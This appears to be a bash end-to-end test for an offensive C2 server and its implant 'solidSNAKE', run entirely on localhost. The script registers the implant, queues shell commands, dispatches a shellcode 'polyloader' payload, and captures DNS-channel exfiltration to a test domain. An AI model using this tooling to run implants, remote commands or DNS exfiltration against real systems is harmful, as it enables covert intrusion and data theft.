#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
C3="${RANGER_C3_DIR:-/tmp/RANGER_C3}"
MOD=/tmp/interop-mod
WORK=/tmp/snake-e2e
KEY="000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f"
IMPID="snakee2e00000001"
PORT=14443

echo "[*] build C2 (Go) + solidSNAKE (C++)..."
(cd "$C3" && go build -o build/ranger-c2 ./cmd/c2)
(cd "$ROOT" && make -s build/solidsnake)

echo "[*] fresh workdir: $WORK"
rm -rf "$WORK"
mkdir -p "$WORK"

echo "[*] starting Go C2 on 127.0.0.1:$PORT (TLS self-signed)..."
(cd "$WORK" && exec "$C3/build/ranger-c2" --listen "127.0.0.1:$PORT" --gen-certs \
	--db "$WORK/c2.db" --key "$KEY" --password snake-e2e --id snake-e2e > "$WORK/c2.log" 2>&1) &
C2PID=$!
trap 'kill "$C2PID" 2>/dev/null || true' EXIT

for _ in $(seq 1 100); do
	(echo > "/dev/tcp/127.0.0.1/$PORT") 2>/dev/null && break
	sleep 0.2
done
grep -q "starting TLS" "$WORK/c2.log" || { echo "FAIL: C2 did not start"; cat "$WORK/c2.log"; exit 1; }
echo "    C2 up (pid $C2PID)"

SNAKE="$ROOT/build/solidsnake"

echo "[*] beacon #1 - register..."
"$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --once --id "$IMPID" --debug 2>&1 | sed 's/^/    /'

IMP=$(sqlite3 "$WORK/c2.db" "SELECT id FROM implants LIMIT 1;" 2>/dev/null || true)
[ -n "$IMP" ] && [ "${#IMP}" -eq 16 ] || { echo "FAIL: implant not registered (got '$IMP')"; exit 1; }
echo "    registered: $IMP"

echo "[*] queue a shell task (via the production store code)..."
mkdir -p "$MOD/internal" "$MOD/cmd/taskpush"
[ -d "$MOD/internal/store" ] || cp -r "$C3/internal/store" "$MOD/internal/"
cp "$ROOT/harness/taskpush.go" "$MOD/cmd/taskpush/main.go"
(cd "$MOD" && go run ./cmd/taskpush "$WORK/c2.db" "$IMP" "id") | sed 's/^/    /'

echo "[*] beacon #2 - fetch, execute, report..."
"$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --once --id "$IMP" --debug 2>&1 | sed 's/^/    /'

STATUS=""
for _ in $(seq 1 25); do
	STATUS=$(sqlite3 "$WORK/c2.db" "SELECT status FROM tasks LIMIT 1;" 2>/dev/null || true)
	[ "$STATUS" = "completed" ] && break
	sleep 0.2
done
[ "$STATUS" = "completed" ] || { echo "FAIL: task status '$STATUS'"; sqlite3 "$WORK/c2.db" "SELECT * FROM tasks;"; exit 1; }
RESULT=$(sqlite3 "$WORK/c2.db" "SELECT result FROM tasks LIMIT 1;")
echo "$RESULT" | grep -q "uid=" || { echo "FAIL: unexpected result: $RESULT"; exit 1; }
echo "    task completed: $RESULT"

echo "[*] TLS trust modes - fingerprint pin + CA file..."
CERT=$(find "$WORK" -type f \( -name '*.pem' -o -name '*.crt' \) ! -name '*key*' | head -1)
if [ -n "${CERT:-}" ]; then
	FP=$(openssl x509 -in "$CERT" -noout -fingerprint -sha256 | cut -d= -f2 | tr -d ':' | tr 'A-F' 'a-f')
	"$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --fingerprint "$FP" --once --id "$IMP" >/dev/null 2>&1 \
		&& echo "    fingerprint-pinned beacon: OK" || { echo "FAIL: fingerprint beacon"; exit 1; }
	CA_OK=0
	if "$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --ca "$CERT" --once --id "$IMP" 2>"$WORK/ca1.log"; then
		CA_OK=1
	elif "$SNAKE" --c2 "wss://localhost:$PORT/ws" --key "$KEY" --ca "$CERT" --once --id "$IMP" 2>"$WORK/ca2.log"; then
		CA_OK=1
	fi
	if [ "$CA_OK" = 1 ]; then
		echo "    CA-verified beacon: OK"
	else
		echo "    WARN: CA-verified beacon failed: $(tail -1 "$WORK/ca1.log" 2>/dev/null)"
	fi
else
	echo "    WARN: cert file not found under $WORK, skipping trust-mode checks"
fi

echo "[*] REST channel - beacon + task + result over AEAD envelopes..."
(cd "$MOD" && go run ./cmd/taskpush "$WORK/c2.db" "$IMP" "echo rest-mode-ok; id") | sed 's/^/    /'
"$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --once --id "$IMP" --channel rest --debug 2>&1 | sed 's/^/    /'
DONE=0
for _ in $(seq 1 25); do
	DONE=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM tasks WHERE status='completed';" 2>/dev/null || echo 0)
	[ "$DONE" -ge 2 ] && break
	sleep 0.2
done
[ "$DONE" -ge 2 ] || { echo "FAIL: REST task not completed (completed=$DONE)"; exit 1; }
T2=$(sqlite3 "$WORK/c2.db" "SELECT result FROM tasks ORDER BY rowid DESC LIMIT 1;" 2>/dev/null || true)
echo "$T2" | grep -q "rest-mode-ok" || { echo "FAIL: REST result: $T2"; exit 1; }
 echo "    REST mode task completed: $T2"

echo "[*] payload task - registry dispatch (polyloader, decode-only) through the implant..."
(cd "$MOD" && go run ./cmd/taskpush "$WORK/c2.db" "$IMP" payload polyloader shellcode=QUJD key=aa) | sed 's/^/    /'
"$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --once --id "$IMP" --debug 2>&1 | sed 's/^/    /'
DONE=0
for _ in $(seq 1 25); do
	DONE=$(sqlite3 "$WORK/c2.db" "SELECT COUNT(*) FROM tasks WHERE status='completed';" 2>/dev/null || echo 0)
	[ "$DONE" -ge 3 ] && break
	sleep 0.2
done
[ "$DONE" -ge 3 ] || { echo "FAIL: payload task not completed (completed=$DONE)"; exit 1; }
T3=$(sqlite3 "$WORK/c2.db" "SELECT result FROM tasks ORDER BY rowid DESC LIMIT 1;" 2>/dev/null || true)
echo "$T3" | grep -q '202322' || { echo "FAIL: payload result: $T3"; exit 1; }
echo "$T3" | grep -q '"success":true' || { echo "FAIL: payload task not successful: $T3"; exit 1; }
echo "    payload task completed: $T3"

echo "[*] DNS channel - exfil smoke via local UDP catcher..."
python3 - "$WORK/dns_capture.log" <<'PYEOF' &
import socket, sys

out = open(sys.argv[1], "a")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("127.0.0.1", 5399))
first = True
try:
    while True:
        s.settimeout(8 if first else 1.5)
        try:
            data, addr = s.recvfrom(2048)
        except socket.timeout:
            break
        first = False
        i = 12
        labels = []
        while i < len(data) and data[i] != 0:
            n = data[i]
            labels.append(data[i + 1 : i + 1 + n].decode("ascii", "replace"))
            i += 1 + n
        out.write(".".join(labels) + "\n")
        out.flush()
except Exception:
    pass
out.close()
PYEOF
CATCHER=$!
sleep 0.4
"$SNAKE" --c2 "wss://127.0.0.1:$PORT/ws" --key "$KEY" --insecure --once --id "$IMP" --channel dns --dns "dns.test.example" --dns-resolver 127.0.0.1:5399 --debug 2>&1 | sed 's/^/    /'
wait "$CATCHER" 2>/dev/null || true
grep -q "^v0000" "$WORK/dns_capture.log" 2>/dev/null || { echo "FAIL: no DNS queries captured"; exit 1; }
grep -q "dns.test.example$" "$WORK/dns_capture.log" 2>/dev/null || { echo "FAIL: DNS queries missing domain"; exit 1; }
echo "    DNS queries captured: $(wc -l < "$WORK/dns_capture.log") (first: $(head -1 "$WORK/dns_capture.log" | cut -c1-60)...)"

BEACONS=$(sqlite3 "$WORK/c2.db" "SELECT beacon_count FROM implants WHERE id='$IMP';")
echo "[OK] E2E green - solidSNAKE registered ($BEACONS beacons); WS + REST + DNS channels exercised; tasks executed, results stored."
